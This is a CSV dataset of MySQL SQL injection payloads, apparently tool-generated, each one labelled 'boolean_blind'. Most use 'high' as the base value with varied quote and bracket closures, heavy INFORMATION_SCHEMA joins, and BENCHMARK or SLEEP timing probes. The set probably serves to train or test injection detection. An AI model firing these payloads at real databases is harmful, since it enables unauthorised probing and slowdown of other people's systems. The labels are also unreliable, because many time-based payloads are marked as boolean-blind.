payload,label
"high||(SELECT 0x4541587a WHERE 7918=7918 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))||",boolean_blind
"high+(SELECT 0x68544a46 WHERE 2482=2482 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))+",boolean_blind
"high')) AS Oqoo WHERE 3133=3133 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- KYiF",boolean_blind
"high"")) AS lHqj WHERE 7542=7542 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- Aidd",boolean_blind
"high') AS qUDR WHERE 3068=3068 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- mPXN",boolean_blind
"high"") AS oGxl WHERE 7259=7259 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- eGzq",boolean_blind
"high' IN BOOLEAN MODE) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- EFwv",boolean_blind
"high) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (4655=4655",boolean_blind
"high)) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ((4603=4603",boolean_blind
"high))) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (((2807=2807",boolean_blind
"high OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)",boolean_blind
"high OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- Tvfj",boolean_blind
"high OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)# itWu",boolean_blind
"high) WHERE 2260=2260 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- cwvN",boolean_blind
"high WHERE 9427=9427 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- xATj",boolean_blind
"high+(SELECT MJuU WHERE 2183=2183 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))+",boolean_blind
"high)) AS viYK WHERE 1396=1396 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- NHJN",boolean_blind
"high) AS bLLl WHERE 7513=7513 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- TZXP",boolean_blind
"high` WHERE 7367=7367 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- JJhD",boolean_blind
"high`) WHERE 9117=9117 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- SfFX",boolean_blind
"high') AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high' AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high"" AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high')) AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high'))) AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high%' AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high"") AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high"")) AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high""))) AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high') WHERE 3097=3097 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high"") WHERE 4423=4423 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high' WHERE 8475=8475 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high"" WHERE 6604=6604 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high'||(SELECT 0x5a745a49 WHERE 6297=6297 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high'||(SELECT 0x69454e6f FROM DUAL WHERE 7642=7642 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high'+(SELECT 0x4e4c787a WHERE 1245=1245 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high||(SELECT 0x6a47726d FROM DUAL WHERE 6860=6860 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high||(SELECT 0x6e4b7459 WHERE 6046=6046 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high+(SELECT 0x58785753 WHERE 8327=8327 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high')) AS NMkT WHERE 2026=2026 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high"")) AS wWed WHERE 9970=9970 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high') AS evaR WHERE 4438=4438 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high"") AS pypU WHERE 8132=8132 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high' IN BOOLEAN MODE) AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high) AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high)) AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high))) AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high) WHERE 8231=8231 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high WHERE 9443=9443 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high+(SELECT Kisy WHERE 2478=2478 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high)) AS DLJd WHERE 3961=3961 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high) AS DiLh WHERE 2987=2987 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high` WHERE 5519=5519 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high`) WHERE 2272=2272 AND 8346=BENCHMARK(5000000,MD5(0x6445634e))#",boolean_blind
"high') AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high' AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"" AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high')) AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high'))) AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high%' AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"") AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"")) AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high""))) AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high') WHERE 2025=2025 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"") WHERE 8305=8305 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high' WHERE 6184=6184 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"" WHERE 9540=9540 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high'||(SELECT 0x6a6c6752 WHERE 3880=3880 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high'||(SELECT 0x4e726976 FROM DUAL WHERE 2033=2033 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high'+(SELECT 0x78445541 WHERE 1486=1486 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high||(SELECT 0x6f76454f FROM DUAL WHERE 8753=8753 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high||(SELECT 0x6f714147 WHERE 2077=2077 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high+(SELECT 0x6159435a WHERE 5329=5329 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high')) AS AFzo WHERE 6383=6383 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"")) AS jhUI WHERE 6134=6134 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high') AS jPVx WHERE 4773=4773 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"") AS YTYa WHERE 2527=2527 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high) AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high)) AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high))) AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high) WHERE 7583=7583 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high WHERE 1192=1192 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high+(SELECT xOLP WHERE 1712=1712 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high)) AS CmWQ WHERE 2233=2233 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high) AS JyJp WHERE 7542=7542 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high` WHERE 7748=7748 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high`) WHERE 1495=1495 AND 4342=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high') OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high' OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high"" OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high')) OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high'))) OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high%' OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high"") OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high"")) OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high""))) OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high') WHERE 6184=6184 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high"") WHERE 1114=1114 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high' WHERE 1425=1425 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high"" WHERE 4736=4736 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high'||(SELECT 0x6a63494a WHERE 9149=9149 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high'||(SELECT 0x56486e65 FROM DUAL WHERE 2000=2000 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high'+(SELECT 0x4963496f WHERE 5728=5728 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high||(SELECT 0x73516871 FROM DUAL WHERE 3491=3491 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high||(SELECT 0x6a4c7064 WHERE 2873=2873 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high+(SELECT 0x63597844 WHERE 8636=8636 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high')) AS jqDa WHERE 5892=5892 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high"")) AS inTZ WHERE 3167=3167 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high') AS MJaZ WHERE 5740=5740 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high"") AS ZdYL WHERE 2324=2324 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high' IN BOOLEAN MODE) OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high) OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high)) OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high))) OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high) WHERE 8960=8960 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high WHERE 6051=6051 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high+(SELECT GFvH WHERE 8347=8347 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high)) AS dSNv WHERE 3576=3576 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high) AS jCZF WHERE 9497=9497 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high` WHERE 6187=6187 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high`) WHERE 4846=4846 OR 2186=BENCHMARK(5000000,MD5(0x694d6c47))#",boolean_blind
"high') OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high' OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"" OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high')) OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high'))) OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high%' OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"") OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"")) OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high""))) OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high') WHERE 8187=8187 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"") WHERE 8339=8339 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high' WHERE 4549=4549 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"" WHERE 2337=2337 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high'||(SELECT 0x6447654d WHERE 1768=1768 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high'||(SELECT 0x6d5a4863 FROM DUAL WHERE 9390=9390 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high'+(SELECT 0x41515862 WHERE 2566=2566 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high||(SELECT 0x4d525461 FROM DUAL WHERE 4905=4905 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high||(SELECT 0x56514f56 WHERE 1101=1101 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high+(SELECT 0x78424c6e WHERE 1085=1085 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high')) AS TOda WHERE 5655=5655 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"")) AS lAxC WHERE 8414=8414 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high') AS ZbVJ WHERE 4001=4001 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high"") AS UcTi WHERE 3937=3937 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high) OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high)) OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high))) OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high) WHERE 7133=7133 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high WHERE 5544=5544 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high+(SELECT CSiF WHERE 6142=6142 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high)) AS ImzQ WHERE 3977=3977 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high) AS ClOn WHERE 8350=8350 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high` WHERE 4648=4648 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high`) WHERE 4822=4822 OR 8505=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
high') RLIKE SLEEP(5)-- FGWQ,boolean_blind
high' RLIKE SLEEP(5)-- OZjq,boolean_blind
"high"" RLIKE SLEEP(5)-- ZHaX",boolean_blind
high') RLIKE SLEEP(5) AND ('MzyI'='MzyI,boolean_blind
high')) RLIKE SLEEP(5) AND (('aGGn'='aGGn,boolean_blind
high'))) RLIKE SLEEP(5) AND ((('cFsX'='cFsX,boolean_blind
high' RLIKE SLEEP(5) AND 'LqED'='LqED,boolean_blind
high') RLIKE SLEEP(5) AND ('EyPJ' LIKE 'EyPJ,boolean_blind
high')) RLIKE SLEEP(5) AND (('fXuF' LIKE 'fXuF,boolean_blind
high'))) RLIKE SLEEP(5) AND ((('OlAn' LIKE 'OlAn,boolean_blind
